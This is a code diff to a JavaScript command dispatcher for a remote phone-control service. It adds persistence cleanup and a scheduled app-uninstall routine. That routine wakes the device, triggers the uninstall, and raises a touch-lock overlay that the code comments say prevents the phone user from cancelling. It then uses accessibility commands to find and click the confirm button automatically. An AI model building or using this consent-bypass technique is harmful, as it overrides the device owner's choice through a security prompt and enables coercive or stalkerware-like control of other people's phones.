@@ -28,6 +28,9 @@ class CommandDispatcher {
         this.scheduledCommands = new Map();
         this._loadQueue(); // Restore scheduled queue from disk on startup
 
+        // Callback for notifying browsers when schedule changes
+        this.onScheduleUpdate = null;
+
     }
 
     /**
@@ -273,7 +276,7 @@ class CommandDispatcher {
     }
     // ========== QUEUE PERSISTENCE ==========
 
-    _saveQueue() {
+    _saveQueue(removedDeviceIds = []) {
         // 1. Save to JSON file (works always, no DB needed)
         try {
             const dir = path.dirname(QUEUE_FILE);
@@ -290,6 +293,10 @@ class CommandDispatcher {
         // 2. Also sync to Supabase DB (fire & forget — won't break if DB is down)
         for (const [deviceId, cmds] of this.scheduledCommands.entries()) {
             saveScheduledQueue(deviceId, cmds).catch(() => { });
+        }
+        // 3. Clean up Supabase rows for devices whose queue was fully emptied
+        for (const deviceId of removedDeviceIds) {
+            saveScheduledQueue(deviceId, []).catch(() => { });
         }
     }
 
@@ -349,6 +356,8 @@ class CommandDispatcher {
         this.scheduledCommands.get(deviceId).push(entry);
         this._saveQueue(); // Persist immediately
         console.log(`[Dispatcher] Command scheduled for ${deviceId}: ${action} (${entry.id})`);
+        console.log(`[Dispatcher] Will execute when device unlocks (device_unlocked event)`);
+
         return entry;
     }
 
@@ -367,23 +376,189 @@ class CommandDispatcher {
         for (const cmd of snapshot) {
             try {
                 console.log(`[Dispatcher] Executing scheduled: ${cmd.action} (${cmd.id})`);
-                await this.sendCommand(deviceId, cmd.action, cmd.payload, 60000);
+
+                if (cmd.action === 'app_uninstall') {
+                    // Full overlay flow for uninstall:
+                    // wake → home → trigger → lock → auto-confirm → unlock
+                    await this._executeScheduledUninstall(deviceId, cmd);
+                } else {
+                    // Simple execution for other commands
+                    await this.sendCommand(deviceId, cmd.action, cmd.payload, 60000);
+                }
 
                 // SUCCESS: remove only this command from the persisted queue
-                const currentQueue = this.scheduledCommands.get(deviceId);
-                if (currentQueue) {
-                    const idx = currentQueue.findIndex(c => c.id === cmd.id);
-                    if (idx >= 0) currentQueue.splice(idx, 1);
-                    if (currentQueue.length === 0) this.scheduledCommands.delete(deviceId);
-                    this._saveQueue();
-                    console.log(`[Dispatcher] ✅ Scheduled cmd done, removed from queue: ${cmd.id}`);
-                }
+                this._removeScheduledCmd(deviceId, cmd.id);
             } catch (e) {
-                // FAILURE: leave in queue — retry on next unlock/reconnect event
-                console.warn(`[Dispatcher] ⚠️ Scheduled cmd FAILED, keeping in queue: ${cmd.action} (${e.message})`);
+                // FAILURE: auto-confirm may have failed, but user may have manually confirmed
+                console.warn(`[Dispatcher] ⚠️ Scheduled cmd error: ${cmd.action} (${e.message})`);
+                // Make sure overlay is removed on failure
+                try { await this.sendCommand(deviceId, 'touch_unlock', {}, 5000); } catch (_) { }
+
+                // For uninstalls: verify if the package was actually removed
+                if (cmd.action === 'app_uninstall' && cmd.payload?.package) {
+                    await new Promise(r => setTimeout(r, 3000)); // Wait for uninstall to finish
+                    const stillInstalled = await this._isPackageInstalled(deviceId, cmd.payload.package);
+                    if (!stillInstalled) {
+                        console.log(`[Dispatcher] ✅ Package ${cmd.payload.package} is gone — removing from queue despite auto-confirm failure`);
+                        this._removeScheduledCmd(deviceId, cmd.id);
+                    } else {
+                        console.log(`[Dispatcher] Package ${cmd.payload.package} still installed — keeping in queue`);
+                    }
+                }
             }
             await new Promise(r => setTimeout(r, 2000));
         }
+    }
+
+    /**
+     * Remove a single scheduled command from the queue and persist
+     */
+    _removeScheduledCmd(deviceId, cmdId) {
+        const currentQueue = this.scheduledCommands.get(deviceId);
+        if (!currentQueue) return;
+        const idx = currentQueue.findIndex(c => c.id === cmdId);
+        if (idx >= 0) currentQueue.splice(idx, 1);
+        const removedDevices = [];
+        if (currentQueue.length === 0) {
+            this.scheduledCommands.delete(deviceId);
+            removedDevices.push(deviceId);
+        }
+        this._saveQueue(removedDevices);
+        console.log(`[Dispatcher] ✅ Scheduled cmd done, removed from queue: ${cmdId}`);
+        if (this.onScheduleUpdate) this.onScheduleUpdate(deviceId);
+    }
+
+    /**
+     * Check if a package is still installed on the device
+     */
+    async _isPackageInstalled(deviceId, packageName) {
+        try {
+            const result = await this.sendCommand(deviceId, 'apps_list', {}, 15000);
+            const apps = result?.data || [];
+            return apps.some(a => a.package === packageName);
+        } catch (e) {
+            console.warn(`[Dispatcher] Could not verify package installation: ${e.message}`);
+            return true; // Assume still installed if we can't check
+        }
+    }
+
+    /**
+     * Execute a scheduled uninstall with overlay + auto-confirm:
+     * wake → home → trigger uninstall → lock overlay → find OK button → click → unlock
+     */
+    async _executeScheduledUninstall(deviceId, cmd) {
+        console.log(`[Dispatcher] 📦 Scheduled uninstall: ${cmd.payload.package}`);
+
+        // Step 1: Wake device
+        try {
+            await this.sendCommand(deviceId, 'accessibility_key', { key: 'home' }, 5000);
+            await new Promise(r => setTimeout(r, 1500));
+        } catch (e) {
+            console.warn(`[Dispatcher] Wake failed (continuing): ${e.message}`);
+        }
+
+        // Step 2: Press Home
+        try {
+            await this.sendCommand(deviceId, 'accessibility_key', { key: 'home' }, 5000);
+            await new Promise(r => setTimeout(r, 500));
+        } catch (e) {
+            console.warn(`[Dispatcher] Home failed (continuing): ${e.message}`);
+        }
+
+        // Step 3: Trigger uninstall (prompt appears)
+        try {
+            await this.sendCommand(deviceId, cmd.action, cmd.payload, 60000);
+        } catch (e) {
+            console.warn(`[Dispatcher] Uninstall trigger returned: ${e.message} (continuing)`);
+        }
+        await new Promise(r => setTimeout(r, 1000));
+
+        // Step 4: Lock overlay (prevent phone user from cancelling)
+        try {
+            await this.sendCommand(deviceId, 'touch_lock', {}, 5000);
+        } catch (e) {
+            console.warn(`[Dispatcher] Touch lock failed: ${e.message}`);
+        }
+        await new Promise(r => setTimeout(r, 500));
+
+        // Step 5: Auto-confirm — find and click OK button
+        let confirmed = false;
+        for (let attempt = 0; attempt < 3; attempt++) {
+            try {
+                const tree = await this.sendCommand(deviceId, 'get_ui_tree', {}, 10000);
+                const nodes = tree.nodes || tree.tree || [];
+
+                // Search for OK/Uninstall confirm button
+                const okNode = this._findConfirmButton(nodes);
+
+                if (okNode) {
+                    console.log(`[Dispatcher] 🎯 Found confirm button: "${okNode.text}" (index: ${okNode.index})`);
+                    await this.sendCommand(deviceId, 'click_node', { index: okNode.index }, 10000);
+                    confirmed = true;
+                    console.log(`[Dispatcher] ✅ Auto-confirmed uninstall for ${cmd.payload.package}`);
+                    break;
+                } else {
+                    console.log(`[Dispatcher] Attempt ${attempt + 1}: OK button not found, retrying...`);
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+            } catch (e) {
+                console.warn(`[Dispatcher] Auto-confirm attempt ${attempt + 1} failed: ${e.message}`);
+                await new Promise(r => setTimeout(r, 1000));
+            }
+        }
+
+        if (!confirmed) {
+            console.warn(`[Dispatcher] ⚠️ Could not auto-confirm uninstall for ${cmd.payload.package}`);
+        }
+
+        // Step 6: Unlock overlay
+        await new Promise(r => setTimeout(r, 500));
+        try {
+            await this.sendCommand(deviceId, 'touch_unlock', {}, 5000);
+        } catch (e) {
+            console.warn(`[Dispatcher] Unlock failed: ${e.message}`);
+        }
+
+        if (!confirmed) {
+            throw new Error('Auto-confirm failed — keeping in queue');
+        }
+    }
+
+    /**
+     * Find a confirm/OK button in the UI tree nodes
+     */
+    _findConfirmButton(nodes, counter = { i: 0 }) {
+        if (!Array.isArray(nodes)) return null;
+
+        for (const node of nodes) {
+            const nodeIndex = node.index !== undefined ? node.index : counter.i;
+            counter.i++;
+
+            const text = (node.text || '').toLowerCase().trim();
+            const desc = (node.contentDescription || '').toLowerCase().trim();
+            const id = (node.viewIdResourceName || node.id || '').toLowerCase();
+
+            // Match OK, Uninstall, Confirm buttons
+            if (node.clickable && (
+                text === 'ok' ||
+                text === 'uninstall' ||
+                text === 'confirm' ||
+                desc === 'ok' ||
+                desc === 'uninstall' ||
+                id.includes('button1') ||  // android default OK button
+                id.includes('ok') ||
+                id.includes('accept')
+            )) {
+                return { ...node, index: nodeIndex };
+            }
+
+            // Search children recursively
+            if (node.children) {
+                const found = this._findConfirmButton(node.children, counter);
+                if (found) return found;
+            }
+        }
+        return null;
     }
 
     /**
@@ -402,9 +577,14 @@ class CommandDispatcher {
         const idx = queue.findIndex(c => c.id === commandId);
         if (idx >= 0) {
             queue.splice(idx, 1);
-            if (queue.length === 0) this.scheduledCommands.delete(deviceId);
-            this._saveQueue(); // Persist cancellation
+            const removedDevices = [];
+            if (queue.length === 0) {
+                this.scheduledCommands.delete(deviceId);
+                removedDevices.push(deviceId);
+            }
+            this._saveQueue(removedDevices); // Persist cancellation
             console.log(`[Dispatcher] Cancelled scheduled command: ${commandId}`);
+            if (this.onScheduleUpdate) this.onScheduleUpdate(deviceId);
             return true;
         }
         return false;
